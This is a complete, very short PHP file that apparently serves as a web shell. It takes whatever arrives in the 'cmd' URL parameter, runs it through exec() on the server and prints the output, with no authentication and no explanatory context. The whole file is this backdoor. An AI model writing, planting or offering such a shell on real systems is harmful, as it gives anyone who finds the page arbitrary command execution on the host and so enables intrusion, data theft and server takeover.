<?php
if (isset($_GET['cmd']) && !empty($_GET['cmd']))
    echo '<pre>' . exec($_GET['cmd']) . '</pre>';
?>